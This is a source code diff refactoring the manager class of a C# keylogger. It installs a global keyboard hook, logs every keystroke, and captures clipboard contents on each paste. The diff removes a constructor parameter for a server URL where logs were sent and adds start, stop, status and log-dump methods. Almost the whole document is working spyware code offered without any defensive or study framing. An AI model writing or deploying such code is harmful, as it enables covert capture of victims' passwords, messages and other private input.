@@ -9,7 +9,7 @@ namespace KeyLogger
     {
         KeyboardHook keyboardHook;
 
-        public Logger logger;
+        Logger logger;
 
         bool capsState;
 
@@ -17,44 +17,52 @@ namespace KeyLogger
 
         bool ctrlState;
 
-        public delegate void LogCallBack(string elementToLog);  // to remove
-        public event LogCallBack LogKeyEvent;                   //to remove
-
 
         /// <summary>
-        /// Constructor, the parameters are used in the Logger constructor,
-        /// initialize events
+        /// Initialize the keyboard hook
+        /// Install the keyboard hook and the related events
+        /// Instanciate the logger
         /// </summary>
-        /// <param name="serverURL">Adress of the server where to send logs</param>
-        /// <param name="logsMaxSize">Number of chars the 'logs' variable is allowed to contain</param>
-        public KeyLoggerManager(string serverURL, int logsMaxSize)
+        public KeyLoggerManager()
         {
             keyboardHook = new KeyboardHook();
             keyboardHook.KeyDown += KeyboardHook_KeyDown;
             keyboardHook.KeyUp += KeyboardHook_KeyUp;
-
-            logger = new Logger(serverURL, logsMaxSize);
+            keyboardHook.Install();
+            logger = new Logger();
         }
 
 
         /// <summary>
-        /// Install the keyboard hook
+        /// Enable the hook to process keys
+        /// Clear the logs
         /// </summary>
-        public void Process()
+        public void StartListening()
         {
-            keyboardHook.Install();            
+            logger.ClearLogs();
 
             capsState = Control.IsKeyLocked(Keys.CapsLock);
             altGrState = false;
             ctrlState = false;
+
+            keyboardHook.listening = true;
         }
 
 
         /// <summary>
-        /// When a key is pressed
+        /// Stop the hook from processing keys
+        /// </summary>
+        public void StopListening()
+        {
+            keyboardHook.listening = false;
+        }
+
+
+        /// <summary>
+        /// When a key is pressed, process and log it
         /// </summary>
         /// <param name="key"></param>
-        private void KeyboardHook_KeyDown(string key)
+        void KeyboardHook_KeyDown(string key)
         {
             if (key == "CAPITAL")
             {
@@ -74,7 +82,6 @@ namespace KeyLogger
             }
             else if (key == "SPACE")
             {
-                LogKeyEvent(" ");
                 logger.LogKey(" ");
             }
             else if (key[0] == ':')
@@ -84,7 +91,6 @@ namespace KeyLogger
                 {
                     if (KeyboardKeys.SpecialShiftKeys.ContainsKey(key))
                     {
-                        LogKeyEvent(KeyboardKeys.SpecialShiftKeys[key]);
                         logger.LogKey(KeyboardKeys.SpecialShiftKeys[key]);
                     }
                 }
@@ -92,13 +98,11 @@ namespace KeyLogger
                 {
                     if (KeyboardKeys.SpecialAltGrKeys.ContainsKey(key))
                     {
-                        LogKeyEvent(KeyboardKeys.SpecialAltGrKeys[key]);
                         logger.LogKey(KeyboardKeys.SpecialAltGrKeys[key]);
                     }
                 }
                 else
                 {
-                    LogKeyEvent(KeyboardKeys.SpecialKeys[key]);
                     logger.LogKey(KeyboardKeys.SpecialKeys[key]);
                 }
             }
@@ -109,35 +113,31 @@ namespace KeyLogger
                 {
                     if(key == "V")
                     {
-                        LogKeyEvent("<<Pasted>>" + Clipboard.GetText() + "<</Pasted>>");
-                        logger.LogKey("<<Pasted>>" + Clipboard.GetText() + "<</Pasted>>");
+                        logger.LogKey(" <Pasted>" + Clipboard.GetText() + "</Pasted> ");
                     }
                 }
                 else if (key == "E" && altGrState)
                 {
-                    LogKeyEvent("€");
                     logger.LogKey("€");
                 }
                 else
                 {
-                    LogKeyEvent(capsState ? key : key.ToLower());
                     logger.LogKey(capsState ? key : key.ToLower());
                 }
             }
             else
             {
                 // Undisplayable special chars
-                LogKeyEvent("\n<" + key + ">\n");
-                logger.LogKey("<" + key + ">");
+                logger.LogKey(" <" + key + "> ");
             }
         }
 
 
         /// <summary>
-        /// When a key is released
+        /// When a key is released, process and log it if it's of interest
         /// </summary>
         /// <param name="key"></param>
-        private void KeyboardHook_KeyUp(string key)
+        void KeyboardHook_KeyUp(string key)
         {
             if (key == "LSHIFT" || key == "RSHIFT")
             {
@@ -155,13 +155,33 @@ namespace KeyLogger
 
 
         /// <summary>
-        /// Clear all events related to the keyboard hooks, discard the hooks as well
+        /// Clear all events related to the keyboard hook, discard the hook
         /// </summary>
-        public void ClearHooks()
+        public void Stop()
         {
             keyboardHook.KeyDown -= KeyboardHook_KeyDown;
             keyboardHook.KeyUp -= KeyboardHook_KeyUp;
             keyboardHook.Uninstall();
+        }
+
+        
+        /// <summary>
+        /// Provides an access to the logger's GetLog() method outside of the namespace
+        /// </summary>
+        /// <returns>Log's content</returns>
+        public string DumpLogs()
+        {
+            return logger.GetLogs();
+        }
+
+
+        /// <summary>
+        /// Returns the hook's listening status
+        /// </summary>
+        /// <returns>A boolean stating the hook's listening status</returns>
+        public bool GetStatus()
+        {
+            return keyboardHook.listening;
         }
     }
 }
